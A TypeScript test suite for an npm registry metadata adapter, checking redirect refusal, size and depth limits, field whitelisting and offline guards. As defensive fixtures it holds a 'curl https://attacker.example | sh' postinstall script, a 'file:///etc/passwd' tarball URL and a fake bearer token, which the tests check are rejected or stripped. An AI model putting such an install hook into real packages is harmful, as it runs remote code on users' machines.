/**
 * Registry adapter contract.
 *
 * The Registry is untrusted input and an external dependency at the same time,
 * so these tests pin three things: what is accepted, what is refused, and what
 * is never requested at all. They run against a real loopback HTTP server, so
 * URL encoding, status handling and redirect policy are exercised for real.
 */

import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { AppError } from "../../src/errors.ts";
import { LIMITS } from "../../src/npm-registry/normalize.ts";
import {
  NpmRegistryService,
  packagePageUrl,
} from "../../src/npm-registry/service.ts";
import { mcppMetadata, packumentFor } from "../support/packument.ts";
// Installs the loopback-only fetch guard for the whole test process.
import "../support/no-network.ts";
import {
  startFixtureRegistry,
  type FixtureRegistry,
} from "../support/registry-server.ts";

const NAME = "acme-investment-team";
const VERSION = "1.4.0";

let registry: FixtureRegistry;
let service: NpmRegistryService;

const json = (body: unknown, status = 200): Response =>
  new Response(JSON.stringify(body), {
    status,
    headers: { "content-type": "application/json" },
  });

const ref = (packageName = NAME, exactVersion = VERSION) => ({
  sourceId: "npm",
  packageName,
  exactVersion,
});

const codeOf = async (work: Promise<unknown>): Promise<string> => {
  try {
    await work;
  } catch (error) {
    if (error instanceof AppError) return error.code;
    throw error;
  }
  throw new Error("expected the call to fail");
};

beforeEach(() => {
  registry = startFixtureRegistry(() =>
    json(packumentFor({ name: NAME, version: VERSION })),
  );
  service = new NpmRegistryService({
    baseUrl: registry.baseUrl,
    timeoutMs: 2000,
    maxBytes: 256 * 1024,
  });
});

afterEach(() => {
  registry.stop();
});

describe("fetching", () => {
  test("requests the validated package name and nothing else", async () => {
    await service.preview(ref());
    expect(registry.requests).toEqual([`/${NAME}`]);
  });

  test("encodes a scoped package name as one path segment", async () => {
    const scoped = "@acme/investment-team";
    registry.setHandler(({ packageName }) =>
      json(packumentFor({ name: packageName, version: VERSION })),
    );
    const preview = await service.preview(ref(scoped));
    expect(preview.metadata.name).toBe(scoped);
    expect(registry.requests).toEqual([`/${encodeURIComponent(scoped)}`]);
  });

  test("never requests a tarball", async () => {
    await service.preview(ref());
    expect(registry.artifactRequests).toEqual([]);
  });

  test("keeps a snapshot digest stable for identical metadata", async () => {
    const first = await service.preview(ref());
    const second = await service.preview(ref());
    expect(second.metadataDigest).toBe(first.metadataDigest);
    expect(second.metadataJson).toBe(first.metadataJson);
  });

  test("changes the digest when the metadata changes", async () => {
    const first = await service.preview(ref());
    registry.setHandler(() =>
      json(
        packumentFor({
          name: NAME,
          version: VERSION,
          description: "changed",
        }),
      ),
    );
    const second = await service.preview(ref());
    expect(second.metadataDigest).not.toBe(first.metadataDigest);
  });
});

describe("transport failures", () => {
  test("maps a missing package to PACKAGE_NOT_FOUND", async () => {
    registry.setHandler(() => json({ error: "Not found" }, 404));
    expect(await codeOf(service.preview(ref()))).toBe("PACKAGE_NOT_FOUND");
  });

  test("maps a rate limit to REGISTRY_RATE_LIMITED", async () => {
    registry.setHandler(() => new Response("slow down", { status: 429 }));
    expect(await codeOf(service.preview(ref()))).toBe("REGISTRY_RATE_LIMITED");
  });

  test("maps an upstream failure to REGISTRY_UNAVAILABLE", async () => {
    registry.setHandler(() => new Response("boom", { status: 503 }));
    expect(await codeOf(service.preview(ref()))).toBe("REGISTRY_UNAVAILABLE");
  });

  test("maps a timeout to REGISTRY_UNAVAILABLE", async () => {
    registry.setHandler(async () => {
      await Bun.sleep(400);
      return json({});
    });
    const impatient = new NpmRegistryService({
      baseUrl: registry.baseUrl,
      timeoutMs: 60,
      maxBytes: 256 * 1024,
    });
    expect(await codeOf(impatient.preview(ref()))).toBe("REGISTRY_UNAVAILABLE");
  });

  test("rejects a body that is not JSON", async () => {
    registry.setHandler(() => new Response("<html></html>", { status: 200 }));
    expect(await codeOf(service.preview(ref()))).toBe("METADATA_INVALID");
  });

  test("rejects a response larger than the byte limit", async () => {
    const tiny = new NpmRegistryService({
      baseUrl: registry.baseUrl,
      timeoutMs: 2000,
      maxBytes: 64,
    });
    expect(await codeOf(tiny.preview(ref()))).toBe("METADATA_TOO_LARGE");
  });
});

describe("redirect policy", () => {
  test("follows a same-origin redirect", async () => {
    let hops = 0;
    registry.setHandler(({ url }) => {
      hops += 1;
      if (url.pathname.endsWith("-redirected"))
        return json(packumentFor({ name: NAME, version: VERSION }));
      return new Response(null, {
        status: 302,
        headers: { location: `${url.pathname}-redirected` },
      });
    });
    const preview = await service.preview(ref());
    expect(preview.metadata.version).toBe(VERSION);
    expect(hops).toBe(2);
  });

  test("refuses a redirect to another origin", async () => {
    registry.setHandler(
      () =>
        new Response(null, {
          status: 302,
          headers: { location: "https://attacker.example/packument" },
        }),
    );
    expect(await codeOf(service.preview(ref()))).toBe("REGISTRY_UNAVAILABLE");
  });

  test("refuses a redirect loop", async () => {
    registry.setHandler(({ url }) => {
      // Each hop points at a fresh same-origin path, so the limit is what stops
      // the chain rather than the URL repeating.
      const next = Number(url.searchParams.get("hop") ?? "0") + 1;
      return new Response(null, {
        status: 302,
        headers: { location: `/${NAME}?hop=${next}` },
      });
    });
    expect(await codeOf(service.preview(ref()))).toBe("REGISTRY_UNAVAILABLE");
  });
});

describe("metadata validation", () => {
  test("reports a version the package does not contain", async () => {
    registry.setHandler(() =>
      json(packumentFor({ name: NAME, version: "9.9.9" })),
    );
    expect(await codeOf(service.preview(ref()))).toBe("VERSION_NOT_FOUND");
  });

  test("rejects a packument for a different package", async () => {
    registry.setHandler(() =>
      json(packumentFor({ name: "someone-else", version: VERSION })),
    );
    expect(await codeOf(service.preview(ref()))).toBe("METADATA_INVALID");
  });

  test("rejects a version entry whose version does not match", async () => {
    registry.setHandler(() =>
      json(packumentFor({ name: NAME, version: VERSION }), 200),
    );
    const mismatched = packumentFor({ name: NAME, version: VERSION });
    const versions = mismatched.versions as Record<string, unknown>;
    const entry = versions[VERSION] as Record<string, unknown>;
    versions[VERSION] = { ...entry, version: "2.0.0" };
    registry.setHandler(() => json(mismatched));
    expect(await codeOf(service.preview(ref()))).toBe("METADATA_INVALID");
  });

  test("rejects an unsupported mcpp schema version", async () => {
    registry.setHandler(() =>
      json(
        packumentFor({
          name: NAME,
          version: VERSION,
          mcpp: mcppMetadata({ schemaVersion: 2 }),
        }),
      ),
    );
    expect(await codeOf(service.preview(ref()))).toBe(
      "UNSUPPORTED_SCHEMA_VERSION",
    );
  });

  test("rejects deeply nested input instead of recursing", async () => {
    let nested: Record<string, unknown> = {};
    const root = nested;
    for (let index = 0; index < LIMITS.maxJsonDepth + 4; index += 1) {
      const next: Record<string, unknown> = {};
      nested.child = next;
      nested = next;
    }
    registry.setHandler(() =>
      json(
        packumentFor({
          name: NAME,
          version: VERSION,
          extraVersionFields: { deep: root },
        }),
      ),
    );
    expect(await codeOf(service.preview(ref()))).toBe("METADATA_TOO_LARGE");
  });

  test("rejects too many agents", async () => {
    registry.setHandler(() =>
      json(
        packumentFor({
          name: NAME,
          version: VERSION,
          mcpp: mcppMetadata({
            agents: Array.from(
              { length: LIMITS.maxAgents + 1 },
              (_, index) => ({
                id: `agent-${index}`,
                name: `Agent ${index}`,
              }),
            ),
          }),
        }),
      ),
    );
    expect(await codeOf(service.preview(ref()))).toBe("METADATA_TOO_LARGE");
  });

  test("rejects a duplicate agent id", async () => {
    registry.setHandler(() =>
      json(
        packumentFor({
          name: NAME,
          version: VERSION,
          mcpp: mcppMetadata({
            agents: [
              { id: "analyst", name: "One" },
              { id: "analyst", name: "Two" },
            ],
          }),
        }),
      ),
    );
    expect(await codeOf(service.preview(ref()))).toBe("METADATA_INVALID");
  });

  test("rejects an over-long description", async () => {
    registry.setHandler(() =>
      json(
        packumentFor({
          name: NAME,
          version: VERSION,
          description: "x".repeat(LIMITS.maxDescriptionLength + 1),
        }),
      ),
    );
    expect(await codeOf(service.preview(ref()))).toBe("METADATA_TOO_LARGE");
  });

  test("rejects a non-http tarball URL", async () => {
    registry.setHandler(() =>
      json(
        packumentFor({
          name: NAME,
          version: VERSION,
          tarball: "file:///etc/passwd",
        }),
      ),
    );
    expect(await codeOf(service.preview(ref()))).toBe("METADATA_INVALID");
  });

  test("rejects metadata that embeds a credential", async () => {
    registry.setHandler(() =>
      json(
        packumentFor({
          name: NAME,
          version: VERSION,
          description: "Authorization: Bearer sk-live-9f2b7c1d4e6a8b0c2d4e",
        }),
      ),
    );
    expect(await codeOf(service.preview(ref()))).toBe("METADATA_INVALID");
  });

  test("rejects metadata carrying inline base64 payloads", async () => {
    registry.setHandler(() =>
      json(
        packumentFor({
          name: NAME,
          version: VERSION,
          extraVersionFields: {
            readme: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==",
          },
        }),
      ),
    );
    // `readme` is not whitelisted, so it never reaches the snapshot; the guard
    // that matters is that nothing carries it forward.
    const preview = await service.preview(ref());
    expect(JSON.stringify(preview.metadata)).not.toContain("base64");
  });
});

describe("projection", () => {
  test("keeps only whitelisted fields", async () => {
    registry.setHandler(() =>
      json(
        packumentFor({
          name: NAME,
          version: VERSION,
          description: "投资研究专家团队",
          keywords: ["mcpp", "investment"],
          deprecated: "use 2.0.0",
          unpackedSize: 4096,
          fileCount: 12,
          mcpp: mcppMetadata({
            displayName: "投资研究专家团队",
            summary: "连接市场数据，完成财报与行业研究",
            agents: [
              {
                id: "financial-analyst",
                name: "财报解读顾问",
                description: "分析财务指标",
              },
            ],
            servers: [
              {
                id: "market-data",
                transport: "stdio",
                runtime: "client-local",
              },
            ],
          }),
          extraVersionFields: {
            _npmUser: { name: "maintainer", email: "someone@example.com" },
            _npmOperationalInternal: { host: "npm" },
            scripts: { postinstall: "curl https://attacker.example | sh" },
          },
        }),
      ),
    );
    const { metadata } = await service.preview(ref());
    expect(metadata).toEqual({
      name: NAME,
      version: VERSION,
      description: "投资研究专家团队",
      keywords: ["mcpp", "investment"],
      displayName: "投资研究专家团队",
      summary: "连接市场数据，完成财报与行业研究",
      agents: [
        {
          id: "financial-analyst",
          name: "财报解读顾问",
          description: "分析财务指标",
        },
      ],
      servers: [
        { id: "market-data", transport: "stdio", runtime: "client-local" },
      ],
      integrity: "sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
      tarballUrl: `https://registry.example.com/${NAME}/-/${NAME}-${VERSION}.tgz`,
      unpackedSizeBytes: 4096,
      fileCount: 12,
      deprecated: "use 2.0.0",
      publishedAt: "2026-08-01T00:00:00.000Z",
    });
    expect(JSON.stringify(metadata)).not.toContain("postinstall");
    expect(JSON.stringify(metadata)).not.toContain("_npmUser");
  });

  test("treats a missing mcpp block as a plain connector", async () => {
    const { metadata } = await service.preview(ref());
    expect(metadata.agents).toEqual([]);
    expect(metadata.servers).toEqual([]);
    expect(metadata.displayName).toBeNull();
  });

  test("ignores an unknown time field rather than inventing a date", async () => {
    const packument = packumentFor({ name: NAME, version: VERSION });
    delete packument.time;
    registry.setHandler(() => json(packument));
    const { metadata } = await service.preview(ref());
    expect(metadata.publishedAt).toBeNull();
  });
});

describe("package page link", () => {
  test("is omitted when no homepage is configured", () => {
    expect(packagePageUrl(null, NAME, VERSION)).toBeNull();
  });

  test("encodes the package name and version", () => {
    expect(
      packagePageUrl("https://registry.example.com/", "@acme/team", "1.0.0"),
    ).toBe("https://registry.example.com/package/%40acme%2Fteam/v/1.0.0");
  });
});

/**
 * The suite is only meaningful if it stays offline. `packagePageUrl` above
 * formats an external URL and the fixtures contain tarball URLs, so this proves
 * the guard itself is live rather than merely assumed.
 */
describe("network boundary", () => {
  test("refuses to reach a host outside the loopback interface", async () => {
    await expect(
      fetch("https://registry.example.com/acme-team"),
    ).rejects.toThrow(/Test network access refused/);
  });

  test("allows the loopback fixture", async () => {
    const response = await fetch(`${registry.baseUrl}/${NAME}`);
    expect(response.status).toBe(200);
  });
});
